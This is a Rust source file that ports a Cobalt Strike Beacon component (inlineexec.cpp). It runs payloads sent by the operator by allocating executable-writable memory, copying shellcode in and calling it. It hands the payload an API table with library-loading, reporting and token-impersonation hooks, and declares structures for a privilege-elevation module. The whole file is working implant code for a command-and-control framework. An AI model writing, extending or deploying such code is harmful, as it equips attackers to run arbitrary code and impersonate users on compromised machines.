//! Port of inlineexec.cpp — run an inline (self-contained) payload in a
//! freshly allocated RWX region, handing it a `BEACON_FUNCS` API table
//! (inlinecommon.h) through which it talks to Beacon.

use core::ffi::c_void;
use core::ptr;
use core::slice;

use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA};
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualFree, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
};

use crate::parse::DataP;

/// `BEACON_FUNCS` from inlinecommon.h. The inline payload is machine code
/// that calls through these slots, so the layout must match the C struct
/// exactly. Function-pointer slots are stored as raw addresses.
#[repr(C)]
#[derive(Clone, Copy)]
pub struct BeaconFuncs {
    pub load_library_a: usize,
    pub get_proc_address: usize,
    pub get_module_handle_a: usize,
    pub report: usize,
    pub reportf: usize,
    pub errord: usize,
    pub use_token: usize,
    pub args: *mut u8,
    pub alen: u32,
    pub result: i32,
    pub value: isize, /* HANDLE */
}

impl Default for BeaconFuncs {
    fn default() -> Self {
        BeaconFuncs {
            load_library_a: 0,
            get_proc_address: 0,
            get_module_handle_a: 0,
            report: 0,
            reportf: 0,
            errord: 0,
            use_token: 0,
            args: ptr::null_mut(),
            alen: 0,
            result: 0,
            value: 0,
        }
    }
}

/// `ELEVATE_ARGS` from inlinecommon.h (used by the elevate post-ex).
#[repr(C)]
#[derive(Clone, Copy)]
pub struct ElevateArgs {
    pub command: *mut u16, /* wchar_t * */
    pub pi: *mut c_void,   /* PROCESS_INFORMATION * */
}

/* ------------------------------------------------------------------ */
/* the API-table shims                                                 */
/* ------------------------------------------------------------------ */

/// report — postmsg(char * buffer, int length, int type)
extern "C" fn postmsg_shim(buffer: *mut u8, length: i32, type_: i32) {
    crate::boff::postmsg_shim(type_, buffer, length);
}

/// reportf — postmsgf(int type, char * fmt, ...), limited to a 2048-byte
/// stack buffer exactly like the C version.
extern "C" fn postmsgf_shim(
    type_: i32,
    fmt: *const u8,
    a1: u64,
    a2: u64,
    a3: u64,
    a4: u64,
    a5: u64,
    a6: u64,
    a7: u64,
    a8: u64,
) {
    if fmt.is_null() {
        return;
    }
    let fmt_slice = unsafe { crate::boff::cstr_slice(fmt) };
    let args = [a1, a2, a3, a4, a5, a6, a7, a8];
    if let Some(mut out) = crate::boff::format_string(fmt_slice, &args) {
        /* vsprintf_s writes at most 2047 chars + NUL */
        if out.len() > 2047 {
            out.truncate(2047);
        }
        crate::callback::command_shell_callback(&out, out.len() as i32, type_);
    }
}

/// errord — posterrord(int error, int msg)
extern "C" fn posterrord_shim(error: i32, msg: i32) {
    crate::callback::post_error_d(error, msg);
}

/// UseToken — use_tokenzz(HANDLE token, char * name, DWORD nlen)
extern "C" fn use_tokenzz_shim(token: *mut c_void, name: *mut u8, nlen: u32) -> i32 {
    if name.is_null() {
        return 0;
    }
    let name_slice = unsafe { slice::from_raw_parts_mut(name, nlen as usize) };
    crate::tokens::use_token(token as isize, name_slice, nlen as usize) as i32
}

/// `inline_execute` from inlineexec.cpp: allocate a RWX region, copy the
/// payload in, and call it with a `BEACON_FUNCS` table. Returns the
/// payload's `result` flag.
pub fn inline_execute(payload: &[u8], plength: usize, arg: &[u8], alength: usize) -> bool {
    /* setup our foo object */
    let mut foo = BeaconFuncs {
        load_library_a: LoadLibraryA as *const () as usize,
        get_module_handle_a: GetModuleHandleA as *const () as usize,
        get_proc_address: GetProcAddress as *const () as usize,
        report: postmsg_shim as *const () as usize,
        reportf: postmsgf_shim as *const () as usize,
        errord: posterrord_shim as *const () as usize,
        use_token: use_tokenzz_shim as *const () as usize,
        args: if alength == 0 {
            ptr::null_mut()
        } else {
            arg.as_ptr() as *mut u8
        },
        alen: alength as u32,
        result: 0,
        value: 0,
    };

    /* init and copy over to it */
    let execpatch = unsafe { VirtualAlloc(ptr::null(), plength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE) } as *mut u8;
    if execpatch.is_null() {
        return false;
    }

    /* copy payload to our area */
    unsafe { ptr::copy_nonoverlapping(payload.as_ptr(), execpatch, plength) };

    /* cast our inline func, please */
    let inlinefunc: extern "C" fn(*mut BeaconFuncs) =
        unsafe { core::mem::transmute(execpatch) };

    /* call it */
    inlinefunc(&mut foo);

    /* OK, cleanup! */
    unsafe { VirtualFree(execpatch as *mut c_void, plength, MEM_RELEASE) };

    foo.result != 0
}

/// `command_inline_execute` from inlineexec.cpp: parse
/// `[4b alength][args][payload]` and run the payload inline.
pub fn command_inline_execute(buffer: &[u8], length: usize) {
    let mut parser = DataP::init(&buffer[..length]);

    /* grab our arg; packed as len[4b]data[len] */
    let alength = parser.data_int() as usize;
    let args = match parser.data_ptr(alength) {
        Some(a) => a.to_vec(),
        None => Vec::new(),
    };

    /* grab our payload, which is just the rest of the buffer content */
    let payload = parser.data_buffer();
    let plength = parser.data_length();

    inline_execute(payload, plength, &args, alength);
}
